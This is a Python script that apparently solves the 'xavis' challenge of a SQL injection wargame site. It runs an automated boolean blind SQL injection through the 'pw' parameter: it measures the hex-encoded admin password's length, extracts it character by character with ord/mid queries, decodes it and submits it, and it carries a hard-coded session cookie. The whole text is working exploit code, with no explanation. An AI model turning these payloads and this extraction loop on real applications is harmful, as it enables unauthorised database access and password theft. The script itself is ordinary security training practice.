import requests
url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
cookie = {"PHPSESSID":"ijo071u48pl1ov7p0omre249qv"}
default = "' or id=\"admin\" and "

def GET(params, msg = "Hello admin"):
    if requests.get(url,params,cookies=cookie).text.find(msg) > 0: return True
    else: return False

length = 0
while True:
    if GET({"pw" : default + f"length(hex(pw))={length}#"}):break
    else: length += 1

pw = ""
for i in range(1,length + 1):
    for j in range(0xff):
        if GET({"pw" : default + f"ord(mid(hex(pw),{i},1))={j}#"}):
            pw += chr(j)
            break
PW = ""
for i in range(0, len(pw), len(pw)//3):
    PW += chr(int(pw[i:i+len(pw)//3],16))
    
if GET({"pw" : PW},"Clear!"): print("[*] Success")
